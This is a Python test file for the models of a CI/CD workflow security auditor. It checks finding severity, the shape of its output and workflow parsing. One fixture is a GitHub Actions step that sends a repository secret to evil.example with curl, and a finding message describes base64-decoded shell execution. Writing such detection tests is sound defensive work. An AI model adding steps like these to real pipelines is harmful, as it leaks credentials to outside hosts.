from credence.workflow_audit.models import (
    Severity, Confidence, Platform, Step, Job, Workflow,
    WorkflowFinding,
)


def test_severity_is_uppercase_str_enum_for_cli_gating():
    # cli_gating.SEVERITY_ORDER keys are uppercase strings; .value must match.
    assert Severity.HIGH.value == "HIGH"
    assert Severity.CRITICAL.value == "CRITICAL"


def test_finding_to_dict_has_gating_shape():
    f = WorkflowFinding(
        rule_id="WF-EXEC-001",
        title="Runtime-decoded shell execution",
        severity=Severity.HIGH,
        confidence=Confidence.HIGH,
        platform=Platform.GITHUB_ACTIONS,
        file_path=".github/workflows/ci.yml",
        message="base64 -d piped to bash",
        job="build",
        step_index=2,
        line=14,
        cicd_sec=["CICD-SEC-4"],
        mitre=["T1027", "T1059"],
    )
    d = f.to_dict()
    # cli_gating.exit_code_for reads d["severity"] as an uppercase string
    assert d["severity"] == "HIGH"
    assert d["confidence"] == "HIGH"
    assert d["rule_id"] == "WF-EXEC-001"
    assert d["frameworks"]["cicd_sec"] == ["CICD-SEC-4"]
    assert d["frameworks"]["mitre"] == ["T1027", "T1059"]
    assert d["source"] == "working_tree"


def test_workflow_holds_jobs_and_steps():
    wf = Workflow(path=".github/workflows/ci.yml", name="CI")
    job = Job(job_id="build")
    job.steps.append(Step(index=0, name="checkout", uses="actions/checkout@v4",
                          run=None))
    wf.jobs.append(job)
    assert wf.jobs[0].steps[0].uses == "actions/checkout@v4"
    assert wf.parse_ok is True
    assert wf.permissions_absent is True


def test_public_exports_round_trip_parse_to_resolved():
    from credence.workflow_audit import parse_workflow, resolve_job
    wf = parse_workflow(
        "on: push\njobs:\n  b:\n    runs-on: x\n    env:\n      T: ${{ secrets.X }}\n"
        "    steps:\n      - run: curl -d \"$T\" https://evil.example",
        path=".github/workflows/ci.yml",
    )
    resolved = resolve_job(wf, wf.jobs[0])
    assert resolved[0].secret_vars["T"] == "secrets.X"
